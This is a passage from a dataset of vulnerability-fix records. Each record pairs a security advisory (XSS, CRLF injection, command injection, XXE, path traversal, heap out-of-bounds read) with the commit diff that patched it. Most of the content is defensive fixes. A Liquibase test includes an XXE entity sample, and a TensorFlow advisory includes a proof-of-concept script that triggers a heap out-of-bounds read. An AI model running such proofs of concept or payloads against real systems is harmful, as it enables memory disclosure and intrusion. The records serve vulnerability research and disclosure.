is only\\n-          \/\/ used for the shape, not for the data. Thus, null buffer is ok.\\n+          \/\/ However, for the reshape operator, the second input tensor is\\n+          \/\/ sometimes only used for the shape, not for the data. Thus, null\\n+          \/\/ buffer is ok in this situation.\\n+          \/\/ The situation where null buffer is not ok for reshape operator is\\n+          \/\/ only when there are 2 inputs given to the node and the one\\n+          \/\/ corresponding to the shape (i == 1) is a vector that contains all\\n+          \/\/ dimensions. See `GetOutputShape()` function in\\n+          \/\/ `tensorflow\/lite\/kernels\/reshape.cc`\\n           continue;\\n         } else {\\n           \/\/ In all other cases, we need to return an error as otherwise we will'}}","message_norm":"prevent a null pointer dereference in tflite.\n\npiperorigin-revid: 370800353\nchange-id: ic9c9712ce5c6e384c954dcd640a5bd9ff05c9a05","language":"en","entities":"[('prevent', 'ACTION', ''), ('null pointer dereference', 'SECWORD', ''), ('370800353', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/core\/subgraph.cc'])","num_files":1.0},{"index":2277,"vuln_id":"GHSA-jmgf-p46x-982h","cwe_id":"{'CWE-352'}","score":0.0,"chain":"{'http:\/\/github.com\/rails\/rails\/commit\/7282ed863ca7e6f928bae9162c9a63a98775a19d'}","dataset":"osv","summary":"Moderate severity vulnerability that affects rails CRLF injection vulnerability in Ruby on Rails before 2.0.5 allows remote attackers to inject arbitrary HTTP headers and conduct HTTP response splitting attacks via a crafted URL to the redirect_to function.","published_date":"2017-10-24","chain_len":1,"project":"http:\/\/github.com\/rails\/rails","commit_href":"http:\/\/github.com\/rails\/rails\/commit\/7282ed863ca7e6f928bae9162c9a63a98775a19d","commit_sha":"7282ed863ca7e6f928bae9162c9a63a98775a19d","patch":"SINGLE","chain_ord":"['7282ed863ca7e6f928bae9162c9a63a98775a19d']","before_first_fix_commit":"{'e8577991dcc47bcb11f99fd6582ee2a3f8270498'}","last_fix_commit":"7282ed863ca7e6f928bae9162c9a63a98775a19d","chain_ord_pos":1.0,"commit_datetime":"10\/14\/2008, 09:47:27","message":"Sanitize the URLs passed to redirect_to to prevent a potential response spli\n\nCGI.rb and mongrel don't do any sanitization of the contents of HTTP headers","author":"Michael Koziarski","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'actionpack\/lib\/action_controller\/response.rb': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rails\/rails\/raw\/7282ed863ca7e6f928bae9162c9a63a98775a19d\/actionpack%2Flib%2Faction_controller%2Fresponse.rb', 'patch': '@@ -30,9 +30,9 @@ def charset\\n \\n     def redirect(to_url, response_status)\\n       self.headers[\"Status\"] = response_status\\n-      self.headers[\"Location\"] = to_url\\n+      self.headers[\"Location\"] = to_url.gsub(\/[\\\\r\\\\n]\/, \\'\\')\\n \\n-      self.body = \"<html><body>You are being <a href=\\\\\"#{to_url}\\\\\">redirected<\/a>.<\/body><\/html>\"\\n+      self.body = \"<html><body>You are being <a href=\\\\\"#{CGI.escapeHTML(to_url)}\\\\\">redirected<\/a>.<\/body><\/html>\"\\n     end\\n \\n     def prepare!'}}","message_norm":"sanitize the urls passed to redirect_to to prevent a potential response spli\n\ncgi.rb and mongrel don't do any sanitization of the contents of http headers","language":"en","entities":"[('sanitize', 'SECWORD', ''), ('prevent', 'ACTION', ''), ('sanitization', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['actionpack\/lib\/action_controller\/response.rb'])","num_files":1.0},{"index":2279,"vuln_id":"GHSA-jmqm-f2gx-4fjv","cwe_id":"{'CWE-352'}","score":5.3,"chain":"{'https:\/\/github.com\/npm\/npm-registry-fetch\/commit\/18bf9b97fb1deecdba01ffb05580370846255c88'}","dataset":"osv","summary":"Sensitive information exposure through logs in npm-registry-fetch Affected versions of `npm-registry-fetch` are vulnerable to an information exposure vulnerability through log files. The cli supports URLs like `<protocol>:\/\/[<user>[:<password>]@]<hostname>[:<port>][:][\/]<path>`. The password value is not redacted and is printed to stdout and also to any generated log files.","published_date":"2020-07-07","chain_len":1,"project":"https:\/\/github.com\/npm\/npm-registry-fetch","commit_href":"https:\/\/github.com\/npm\/npm-registry-fetch\/commit\/18bf9b97fb1deecdba01ffb05580370846255c88","commit_sha":"18bf9b97fb1deecdba01ffb05580370846255c88","patch":"SINGLE","chain_ord":"['18bf9b97fb1deecdba01ffb05580370846255c88']","before_first_fix_commit":"{'09e540b09a951ded299ee028e7f1bd21cef5a6da'}","last_fix_commit":"18bf9b97fb1deecdba01ffb05580370846255c88","chain_ord_pos":1.0,"commit_datetime":"06\/30\/2020, 16:32:16","message":"chore: remove auth data from logs (#29)","author":"Claudia Hern\u00e1ndez","comments":null,"stats":"{'additions': 10, 'deletions': 1, 'total': 11}","files":"{'check-response.js': {'additions': 10, 'deletions': 1, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/npm\/npm-registry-fetch\/raw\/18bf9b97fb1deecdba01ffb05580370846255c88\/check-response.js', 'patch': \"@@ -30,9 +30,18 @@ function logRequest (method, res, startTime, opts) {\\n   const attempt = res.headers.get('x-fetch-attempts')\\n   const attemptStr = attempt && attempt > 1 ? ` attempt #${attempt}` : ''\\n   const cacheStr = res.headers.get('x-local-cache') ? ' (from cache)' : ''\\n+\\n+  let urlStr\\n+  try {\\n+    const url = new URL(res.url)\\n+    urlStr = res.url.replace(url.password, '***')\\n+  } catch {\\n+    urlStr = res.url\\n+  }\\n+\\n   opts.log.http(\\n     'fetch',\\n-    `${method.toUpperCase()} ${res.status} ${res.url} ${elapsedTime}ms${attemptStr}${cacheStr}`\\n+    `${method.toUpperCase()} ${res.status} ${urlStr} ${elapsedTime}ms${attemptStr}${cacheStr}`\\n   )\\n }\"}}","message_norm":"chore: remove auth data from logs (#29)","language":"en","entities":"[('remove', 'ACTION', ''), ('auth', 'SECWORD', ''), ('#29', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['check-response.js'])","num_files":1.0},{"index":2286,"vuln_id":"GHSA-jp6r-xcjj-5h7r","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/gchq\/CyberChef\/commit\/01f0625d6a177f9c5df9281f12a27c814c2d8bcf'}","dataset":"osv","summary":"Cross-Site Scripting in cyberchef Versions of `cyberchef` prior to 8.31.3 are vulnerable to Cross-Site Scripting. In `Text Encoding Brute Force` the table rows are created by concatenating the `value` variable unsanitized in the HTML code. If this variable is controlled by user input it allows attackers to execute arbitrary JavaScript in a victim's browser.\n\n\n## Recommendation\n\nUpgrade to version 8.31.3 or later.","published_date":"2019-08-27","chain_len":1,"project":"https:\/\/github.com\/gchq\/CyberChef","commit_href":"https:\/\/github.com\/gchq\/CyberChef\/commit\/01f0625d6a177f9c5df9281f12a27c814c2d8bcf","commit_sha":"01f0625d6a177f9c5df9281f12a27c814c2d8bcf","patch":"SINGLE","chain_ord":"['01f0625d6a177f9c5df9281f12a27c814c2d8bcf']","before_first_fix_commit":"{'38ff7ec89f595dbe5971c3577fa29a142b4b2416'}","last_fix_commit":"01f0625d6a177f9c5df9281f12a27c814c2d8bcf","chain_ord_pos":1.0,"commit_datetime":"04\/14\/2019, 21:00:17","message":"Fixed XSS in 'Text Encoding Brute Force. Closes #539","author":"n1474335","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/core\/operations\/TextEncodingBruteForce.mjs': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gchq\/CyberChef\/raw\/01f0625d6a177f9c5df9281f12a27c814c2d8bcf\/src%2Fcore%2Foperations%2FTextEncodingBruteForce.mjs', 'patch': '@@ -79,7 +79,7 @@ class TextEncodingBruteForce extends Operation {\\n         let table = \"<table class=\\'table table-hover table-sm table-bordered table-nonfluid\\'><tr><th>Encoding<\/th><th>Value<\/th><\/tr>\";\\n \\n         for (const enc in encodings) {\\n-            const value = Utils.printable(encodings[enc], true);\\n+            const value = Utils.escapeHtml(Utils.printable(encodings[enc], true));\\n             table += `<tr><td>${enc}<\/td><td>${value}<\/td><\/tr>`;\\n         }'}}","message_norm":"fixed xss in 'text encoding brute force. closes #539","language":"en","entities":"[('fixed', 'ACTION', ''), ('xss', 'SECWORD', ''), ('encoding', 'SECWORD', ''), ('#539', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/core\/operations\/TextEncodingBruteForce.mjs'])","num_files":1.0},{"index":2288,"vuln_id":"GHSA-jpj5-hg26-6jgc","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/Xhofe\/alist\/commit\/6af17e2509a400979420f613fd7f2f9721fdcd6e'}","dataset":"osv","summary":"Cross-site Scripting in Alist Alist versions 2.0.10 through 2.1.0 were discovered to contain a cross-site scripting (XSS) vulnerability via \/i\/:data\/ipa.plist. This issue was fixed in version 2.1.1.","published_date":"2022-03-13","chain_len":1,"project":"https:\/\/github.com\/Xhofe\/alist","commit_href":"https:\/\/github.com\/Xhofe\/alist\/commit\/6af17e2509a400979420f613fd7f2f9721fdcd6e","commit_sha":"6af17e2509a400979420f613fd7f2f9721fdcd6e","patch":"SINGLE","chain_ord":"['6af17e2509a400979420f613fd7f2f9721fdcd6e']","before_first_fix_commit":"{'5193b2aa7df73231ebf68e90b3295f2a5c0916a2'}","last_fix_commit":"6af17e2509a400979420f613fd7f2f9721fdcd6e","chain_ord_pos":1.0,"commit_datetime":"03\/01\/2022, 12:09:25","message":":lock: fix #645 xss vulnerability","author":"Xhofe","comments":null,"stats":"{'additions': 9, 'deletions': 0, 'total': 9}","files":"{'server\/controllers\/other.go': {'additions': 9, 'deletions': 0, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/alist-org\/alist\/raw\/6af17e2509a400979420f613fd7f2f9721fdcd6e\/server%2Fcontrollers%2Fother.go', 'patch': '@@ -7,6 +7,7 @@ import (\\n \\t\"github.com\/Xhofe\/alist\/server\/common\"\\n \\t\"github.com\/Xhofe\/alist\/utils\"\\n \\t\"github.com\/gin-gonic\/gin\"\\n+\\t\"net\/url\"\\n \\t\"strings\"\\n )\\n \\n@@ -24,11 +25,19 @@ func Plist(c *gin.Context) {\\n \\t\\treturn\\n \\t}\\n \\tu := string(bytes)\\n+\\tuUrl, err := url.Parse(u)\\n+\\tif err != nil {\\n+\\t\\tcommon.ErrorResp(c, err, 500)\\n+\\t\\treturn\\n+\\t}\\n \\tname := utils.Base(u)\\n+\\tu = uUrl.String()\\n \\tipaIndex := strings.Index(name, \".ipa\")\\n \\tif ipaIndex != -1 {\\n \\t\\tname = name[:ipaIndex]\\n \\t}\\n+\\tname = strings.ReplaceAll(name, \"<\", \"[\")\\n+\\tname = strings.ReplaceAll(name, \">\", \"]\")\\n \\tplist := fmt.Sprintf(`<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-\/\/Apple\/\/DTD PLIST 1.0\/\/EN\" \"http:\/\/www.apple.com\/DTDs\/PropertyList-1.0.dtd\">\\n <plist version=\"1.0\">\\n     <dict>'}}","message_norm":":lock: fix #645 xss vulnerability","language":"en","entities":"[('fix', 'ACTION', ''), ('#645', 'ISSUE', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/controllers\/other.go'])","num_files":1.0},{"index":2289,"vuln_id":"GHSA-jppv-gw3r-w3q8","cwe_id":"{'CWE-78'}","score":0.0,"chain":"{'https:\/\/github.com\/ruby\/rake\/commit\/5b8f8fc41a5d7d7d6a5d767e48464c60884d3aee'}","dataset":"osv","summary":"OS Command Injection in Rake There is an OS command injection vulnerability in Ruby Rake before 12.3.3 in Rake::FileList when supplying a filename that begins with the pipe character `|`.","published_date":"2020-02-28","chain_len":1,"project":"https:\/\/github.com\/ruby\/rake","commit_href":"https:\/\/github.com\/ruby\/rake\/commit\/5b8f8fc41a5d7d7d6a5d767e48464c60884d3aee","commit_sha":"5b8f8fc41a5d7d7d6a5d767e48464c60884d3aee","patch":"SINGLE","chain_ord":"['5b8f8fc41a5d7d7d6a5d767e48464c60884d3aee']","before_first_fix_commit":"{'6497ba4d94d12c123df48cc8ab40f0a4eb7fb337'}","last_fix_commit":"5b8f8fc41a5d7d7d6a5d767e48464c60884d3aee","chain_ord_pos":1.0,"commit_datetime":"07\/22\/2019, 01:23:43","message":"Use File.open explicitly.","author":"Hiroshi SHIBATA","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/rake\/file_list.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ruby\/rake\/raw\/5b8f8fc41a5d7d7d6a5d767e48464c60884d3aee\/lib%2Frake%2Ffile_list.rb', 'patch': '@@ -294,7 +294,7 @@ def egrep(pattern, *options)\\n       matched = 0\\n       each do |fn|\\n         begin\\n-          open(fn, \"r\", *options) do |inf|\\n+          File.open(fn, \"r\", *options) do |inf|\\n             count = 0\\n             inf.each do |line|\\n               count += 1'}}","message_norm":"use file.open explicitly.","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/rake\/file_list.rb'])","num_files":1.0},{"index":2292,"vuln_id":"GHSA-jq4v-f5q6-mjqq","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/lxml\/lxml\/pull\/316\/commits\/10ec1b4e9f93713513a3264ed6158af22492f270', 'https:\/\/github.com\/lxml\/lxml\/commit\/a5f9cb52079dc57477c460dbe6ba0f775e14a999', 'https:\/\/github.com\/lxml\/lxml\/commit\/2d01a1ba8984e0483ce6619b972832377f208a0d'}","dataset":"osv","summary":"lxml before 4.6.3 vulnerable to Cross-Site Scripting  An XSS vulnerability was discovered in the python `lxml` clean module versions before 4.6.3. When disabling `the safe_attrs_only` and `forms` arguments, the `Cleaner` class does not remove the `formaction` attribute allowing for JS to bypass the sanitizer. A remote attacker could exploit this flaw to run arbitrary JS code on users who interact with incorrectly sanitized HTML. This issue is patched in `lxml` 4.6.3.","published_date":"2021-03-22","chain_len":3,"project":"https:\/\/github.com\/lxml\/lxml","commit_href":"https:\/\/github.com\/lxml\/lxml\/pull\/316\/commits\/10ec1b4e9f93713513a3264ed6158af22492f270","commit_sha":"10ec1b4e9f93713513a3264ed6158af22492f270","patch":"MULTI","chain_ord":"['10ec1b4e9f93713513a3264ed6158af22492f270', '2d01a1ba8984e0483ce6619b972832377f208a0d', 'a5f9cb52079dc57477c460dbe6ba0f775e14a999']","before_first_fix_commit":"{'2d01a1ba8984e0483ce6619b972832377f208a0d'}","last_fix_commit":"a5f9cb52079dc57477c460dbe6ba0f775e14a999","chain_ord_pos":1.0,"commit_datetime":"03\/20\/2021, 06:49:25","message":"Add formaction attribute to defs.link_attrs","author":"Kevin Chung","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'src\/lxml\/html\/defs.py': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/lxml\/lxml\/raw\/10ec1b4e9f93713513a3264ed6158af22492f270\/src%2Flxml%2Fhtml%2Fdefs.py', 'patch': \"@@ -23,6 +23,8 @@\\n     'usemap',\\n     # Not standard:\\n     'dynsrc', 'lowsrc',\\n+    # HTML5 formaction\\n+    'formaction'\\n     ])\\n \\n # Not in the HTML 4 spec:\"}}","message_norm":"add formaction attribute to defs.link_attrs","language":"en","entities":"[('add', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lxml\/html\/defs.py'])","num_files":1.0},{"index":2297,"vuln_id":"GHSA-jr37-66pj-36v7","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/Bottelet\/DaybydayCRM\/commit\/002dc75f400cf307bd00b71a5a93f1e26e52cee2'}","dataset":"osv","summary":"Cross-site Scripting in DayByDay CRM In Daybyday CRM, version 2.2.0 is vulnerable to Stored Cross-Site Scripting (XSS) vulnerability that allows low privileged application users to store malicious scripts in the title field of new tasks. These scripts are executed in a victim\u2019s browser when they open the \u201c\/tasks\u201d page to view all the tasks.","published_date":"2022-01-08","chain_len":1,"project":"https:\/\/github.com\/Bottelet\/DaybydayCRM","commit_href":"https:\/\/github.com\/Bottelet\/DaybydayCRM\/commit\/002dc75f400cf307bd00b71a5a93f1e26e52cee2","commit_sha":"002dc75f400cf307bd00b71a5a93f1e26e52cee2","patch":"SINGLE","chain_ord":"['002dc75f400cf307bd00b71a5a93f1e26e52cee2']","before_first_fix_commit":"{'fe842ea5ede237443f1f45a99aeb839133115d8b'}","last_fix_commit":"002dc75f400cf307bd00b71a5a93f1e26e52cee2","chain_ord_pos":1.0,"commit_datetime":"06\/25\/2021, 19:53:06","message":"fix xss for tasks index","author":"Casper Bottelet","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'app\/Http\/Controllers\/TasksController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Bottelet\/DaybydayCRM\/raw\/002dc75f400cf307bd00b71a5a93f1e26e52cee2\/app%2FHttp%2FControllers%2FTasksController.php', 'patch': '@@ -82,7 +82,7 @@ public function anyData()\\n             })\\n             ->addColumn(\\'view\\', function ($tasks) {\\n                 return \\'<a href=\"\\' . route(\"tasks.show\", $tasks->external_id) . \\'\" class=\"btn btn-link\">\\' . __(\\'View\\') .\\'<\/a>\\'\\n-                . \\'<a data-toggle=\"modal\" data-id=\"\\'. route(\\'tasks.destroy\\',$tasks->external_id) . \\'\" data-title=\"\\'. $tasks->title . \\'\" data-target=\"#deletion\" class=\"btn btn-link\">\\' . __(\\'Delete\\') .\\'<\/a>\\'\\n+                . \\'<a data-toggle=\"modal\" data-id=\"\\'. route(\\'tasks.destroy\\',$tasks->external_id) . \\'\" data-target=\"#deletion\" class=\"btn btn-link\">\\' . __(\\'Delete\\') .\\'<\/a>\\'\\n                 ;\\n             })\\n             ->rawColumns([\\'titlelink\\',\\'view\\', \\'status_id\\'])'}}","message_norm":"fix xss for tasks index","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/TasksController.php'])","num_files":1.0},{"index":2299,"vuln_id":"GHSA-jr9c-h74f-2v28","cwe_id":"{'CWE-285', 'CWE-863'}","score":7.1,"chain":"{'https:\/\/github.com\/go-gitea\/gitea\/commit\/1314f38b59748397b3429fb9bc9f9d6bac85d2f2'}","dataset":"osv","summary":"Improper Authorization in Gitea Gitea 1.16.3 and prior is vulnerable to improper authorization. A patch is available and is anticipated to be part of the 1.16.4 release.","published_date":"2022-03-11","chain_len":1,"project":"https:\/\/github.com\/go-gitea\/gitea","commit_href":"https:\/\/github.com\/go-gitea\/gitea\/commit\/1314f38b59748397b3429fb9bc9f9d6bac85d2f2","commit_sha":"1314f38b59748397b3429fb9bc9f9d6bac85d2f2","patch":"SINGLE","chain_ord":"['1314f38b59748397b3429fb9bc9f9d6bac85d2f2']","before_first_fix_commit":"{'7443213707bde01ee8343d49b26824dc50e1ac18'}","last_fix_commit":"1314f38b59748397b3429fb9bc9f9d6bac85d2f2","chain_ord_pos":1.0,"commit_datetime":"03\/10\/2022, 02:00:05","message":"fix pam authorization (#19040)\n\nhttps:\/\/huntr.dev\/bounties\/8d221f92-b2b1-4878-bc31-66ff272e5ceb\/\r\n\r\nCo-authored-by: ysf <34326+ysf@users.noreply.github.com>","author":"zeripath","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'modules\/auth\/pam\/pam.go': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/go-gitea\/gitea\/raw\/1314f38b59748397b3429fb9bc9f9d6bac85d2f2\/modules%2Fauth%2Fpam%2Fpam.go', 'patch': '@@ -34,6 +34,10 @@ func Auth(serviceName, userName, passwd string) (string, error) {\\n \\tif err = t.Authenticate(0); err != nil {\\n \\t\\treturn \"\", err\\n \\t}\\n+\\t\\n+\\tif err = t.AcctMgmt(0); err != nil {\\n+\\t  return \"\", err\\n+  }\\n \\n \\t\/\/ PAM login names might suffer transformations in the PAM stack.\\n \\t\/\/ We should take whatever the PAM stack returns for it.'}}","message_norm":"fix pam authorization (#19040)\n\nhttps:\/\/huntr.dev\/bounties\/8d221f92-b2b1-4878-bc31-66ff272e5ceb\/\r\n\r\nco-authored-by: ysf <34326+ysf@users.noreply.github.com>","language":"en","entities":"[('fix', 'ACTION', ''), ('#19040', 'ISSUE', ''), ('https:\/\/huntr.dev\/bounties\/8d221f92-b2b1-4878-bc31-66ff272e5ceb\/', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/auth\/pam\/pam.go'])","num_files":1.0},{"index":2304,"vuln_id":"GHSA-jv6v-fvvx-4932","cwe_id":"{'CWE-610', 'CWE-73'}","score":6.2,"chain":"{'https:\/\/github.com\/octobercms\/october\/commit\/2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc'}","dataset":"osv","summary":"Arbitrary File Deletion vulnerability in OctoberCMS ### Impact\nAn attacker can exploit this vulnerability to delete arbitrary local files of an October CMS server. The vulnerability is only exploitable by an authenticated backend user with the `cms.manage_assets` permission.\n\n### Patches\nIssue has been patched in Build 466 (v1.0.466).\n\n### Workarounds\nApply https:\/\/github.com\/octobercms\/october\/commit\/2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc to your installation manually if unable to upgrade to Build 466.\n\n### References\nReported by [Sivanesh Ashok](https:\/\/stazot.com\/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [hello@octobercms.com](mailto:hello@octobercms.com)\n\n### Threat assessment:\n<img width=\"1241\" alt=\"Screen Shot 2020-03-31 at 12 16 53 PM\" src=\"https:\/\/user-images.githubusercontent.com\/7253840\/78060872-89354d00-7349-11ea-8c2b-5881b0a50736.png\">","published_date":"2020-06-03","chain_len":1,"project":"https:\/\/github.com\/octobercms\/october","commit_href":"https:\/\/github.com\/octobercms\/october\/commit\/2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc","commit_sha":"2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc","patch":"SINGLE","chain_ord":"['2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc']","before_first_fix_commit":"{'a9b4a5b2c77afe5ad974455bec69da620b443a5d'}","last_fix_commit":"2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc","chain_ord_pos":1.0,"commit_datetime":"03\/31\/2020, 09:37:31","message":"Improve asset file path handling","author":"Luke Towers","comments":null,"stats":"{'additions': 8, 'deletions': 1, 'total': 9}","files":"{'modules\/cms\/classes\/Asset.php': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/octobercms\/october\/raw\/2b8939cc8b5b6fe81e093fe2c9f883ada4e3c8cc\/modules%2Fcms%2Fclasses%2FAsset.php', 'patch': \"@@ -285,7 +285,14 @@ public function getFilePath($fileName = null)\\n             $fileName = $this->fileName;\\n         }\\n \\n-        return $this->theme->getPath().'\/'.$this->dirName.'\/'.$fileName;\\n+        \/\/ Limit paths to those under the assets directory\\n+        $directory = $this->theme->getPath() . '\/' . $this->dirName . '\/';\\n+        $path = realpath($directory . $fileName);\\n+        if (!starts_with($path, $directory)) {\\n+            return false;\\n+        }\\n+\\n+        return $path;\\n     }\\n \\n     \/**\"}}","message_norm":"improve asset file path handling","language":"en","entities":"[('improve', 'ACTION', ''), ('asset', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['modules\/cms\/classes\/Asset.php'])","num_files":1.0},{"index":2306,"vuln_id":"GHSA-jvfv-hrrc-6q72","cwe_id":"{'CWE-611'}","score":9.8,"chain":"{'https:\/\/github.com\/liquibase\/liquibase\/commit\/33d9d925082097fb1a3d2fc8e44423d964cd9381'}","dataset":"osv","summary":"Improper Restriction of XML External Entity Reference in Liquibase The XMLChangeLogSAXParser() function in Liquibase prior to version 4.8.0 contains an issue that may lead to to Improper Restriction of XML External Entity Reference.","published_date":"2022-03-05","chain_len":1,"project":"https:\/\/github.com\/liquibase\/liquibase","commit_href":"https:\/\/github.com\/liquibase\/liquibase\/commit\/33d9d925082097fb1a3d2fc8e44423d964cd9381","commit_sha":"33d9d925082097fb1a3d2fc8e44423d964cd9381","patch":"SINGLE","chain_ord":"['33d9d925082097fb1a3d2fc8e44423d964cd9381']","before_first_fix_commit":"{'8d90124793d0053520365b7686688a1af7cc5102'}","last_fix_commit":"33d9d925082097fb1a3d2fc8e44423d964cd9381","chain_ord_pos":1.0,"commit_datetime":"02\/04\/2022, 17:43:43","message":"Added liquibase.secureParsing test","author":"Nathan Voxland","comments":null,"stats":"{'additions': 3, 'deletions': 3, 'total': 6}","files":"{'liquibase-core\/src\/test\/groovy\/liquibase\/parser\/core\/xml\/XMLChangeLogSAXParserTest.groovy': {'additions': 3, 'deletions': 3, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/liquibase\/liquibase\/raw\/33d9d925082097fb1a3d2fc8e44423d964cd9381\/liquibase-core%2Fsrc%2Ftest%2Fgroovy%2Fliquibase%2Fparser%2Fcore%2Fxml%2FXMLChangeLogSAXParserTest.groovy', 'patch': '@@ -23,7 +23,7 @@ class XMLChangeLogSAXParserTest extends Specification {\\n \\n     def INSECURE_XML = \"\"\"\\n <!DOCTYPE databaseChangeLog [\\n-        <!ENTITY insecure SYSTEM \"https:\/\/localhost\/insecure\">\\n+        <!ENTITY insecure SYSTEM \"file:\/\/invalid.txt\">\\n         ]>\\n \\n <databaseChangeLog xmlns=\"http:\/\/www.liquibase.org\/xml\/ns\/dbchangelog\"\\n@@ -83,7 +83,7 @@ class XMLChangeLogSAXParserTest extends Specification {\\n \\n         then:\\n         def e = thrown(ChangeLogParseException)\\n-        e.message.contains(\"Failed to read external document \\'insecure\\'\")\\n+        e.message.contains(\"access is not allowed due to restriction set by the accessExternalDTD property\")\\n     }\\n \\n     def \"allows liquibase.secureParsing=false to disable secure parsing\"() {\\n@@ -97,7 +97,7 @@ class XMLChangeLogSAXParserTest extends Specification {\\n \\n         then:\\n         def e = thrown(ChangeLogParseException)\\n-        e.message.contains(\"Connection refused\")\\n+        e.message.contains(\"Error Reading Changelog File: invalid.txt\")\\n     }\\n \\n }'}}","message_norm":"added liquibase.secureparsing test","language":"en","entities":"[('added', 'ACTION', ''), ('liquibase.secureparsing', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['liquibase-core\/src\/test\/groovy\/liquibase\/parser\/core\/xml\/XMLChangeLogSAXParserTest.groovy'])","num_files":1.0},{"index":2313,"vuln_id":"GHSA-jwf9-w5xm-f437","cwe_id":"{'CWE-125'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eb921122119a6b6e470ee98b89e65d721663179d', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bb6a0383ed553c286f87ca88c207f6774d5c4a8f'}","dataset":"osv","summary":"Heap OOB in TFLite's `Gather*` implementations ### Impact\nTFLite's [`GatherNd` implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/gather_nd.cc#L124) does not support negative indices but there are no checks for this situation.\n\nHence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in `indices`.\n\nSimilar issue exists in [`Gather` implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/gather.cc).\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n```\n\n### Patches\nWe have patched the issue in GitHub commits [bb6a0383ed553c286f87ca88c207f6774d5c4a8f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/bb6a0383ed553c286f87ca88c207f6774d5c4a8f) and [eb921122119a6b6e470ee98b89e65d721663179d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/eb921122119a6b6e470ee98b89e65d721663179d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu 